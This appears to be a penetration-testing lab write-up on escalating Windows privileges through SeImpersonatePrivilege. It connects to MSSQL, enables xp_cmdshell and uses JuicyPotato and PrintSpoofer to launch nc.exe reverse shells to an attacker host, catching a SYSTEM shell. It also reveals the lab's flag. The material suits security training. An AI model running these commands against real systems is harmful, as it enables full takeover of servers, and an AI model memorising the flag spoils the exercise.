# SeImpersonate and SeAssignPrimaryToken

`SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` is the key to elevate the local privileges to System. Normally, these privileges are assigned to service users, admins, and local systems — high integrity elevated users.

If the machine is running **IIS** or **SQL services**, these privileges will be **enabled by default**.

**Connecting with MSSQLClient.py**

```bash
mssqlclient.py sql_dev@10.129.43.30 -windows-auth
```

**Enabling xp\_cmdshell**

```shell-session
SQL> enable_xp_cmdshell

[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install
```

Note: We don't actually have to type `RECONFIGURE` as Impacket does this for us.

**Confirming Access**

```shell-session
SQL> xp_cmdshell whoami

output                                                                             

--------------------------------------------------------------------------------   

nt service\mssql$sqlexpress01
```

**Checking Account Privileges**

```shell-session
SQL> xp_cmdshell whoami /priv

output                                                                             

--------------------------------------------------------------------------------   
                                                                    
PRIVILEGES INFORMATION                                                             

----------------------                                                             
Privilege Name                Description                               State      

============================= ========================================= ========   

SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled    
SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
SeCreateGlobalPrivilege       Create global objects                     Enabled    
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   
```

* [<mark style="color:purple;">**SeImpersonatePrivilege**</mark>](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege) <mark style="color:purple;">**is listed**</mark>

**Escalating Privileges Using JuicyPotato**

```shell-session
SQL> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *

output                                                                             

--------------------------------------------------------------------------------   

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 53375                               
                                                                            
[+] authresult 0                                                                   
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM                                                                                                    
[+] CreateProcessWithTokenW OK                                                     
[+] calling 0x000000000088ce08
```

* `-l` -> COM server listening port
* `-p` -> program to launch
* `-a` -> argument passed to cmd.exe
* `-t` -> create process call

```shell-session
sudo nc -lnvp 8443

listening on [any] 8443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.30] 50332
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.


C:\Windows\system32>whoami

whoami
nt authority\system


C:\Windows\system32>hostname

hostname
WINLPE-SRV01
```

### PrintSpoofer and RoguePotato

JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards.

[PrintSpoofer](https://github.com/itm4n/PrintSpoofer) and [RoguePotato](https://github.com/antonioCoco/RoguePotato) can be used to leverage the same privileges and gain `NT AUTHORITY\SYSTEM` level access.

**Escalating Privileges using PrintSpoofer**

```shell-session
SQL> xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"

output                                                                             

--------------------------------------------------------------------------------   

[+] Found privilege: SeImpersonatePrivilege                                        
[+] Named pipe listening...                                                        
[+] CreateProcessAsUser() OK                                                       

NULL 
```

* `-c` -> execute a command

**Catching Reverse Shell as SYSTEM**

```shell-session
nc -lnvp 8443

listening on [any] 8443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.30] 49847
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.


C:\Windows\system32>whoami

whoami
nt authority\system
```

## Assessment

**Escalate privileges using one of the methods shown in this section. Submit the contents of the flag file located at c:\Users\Administrator\Desktop\SeImpersonate\flag.txt**

1.  launch `impacket-mssqlclient` to connect to mssqlserver

    <figure><img src="../../../.gitbook/assets/image (113).png" alt=""><figcaption></figcaption></figure>
2.  Seems like the xp\_xmdshell is already enabled and SeImpersonatePrivilege is enabled.

    <figure><img src="../../../.gitbook/assets/image (52).png" alt=""><figcaption></figcaption></figure>
3.  run the attack\


    <figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption><p>F3ar_th3_p0tato!</p></figcaption></figure>
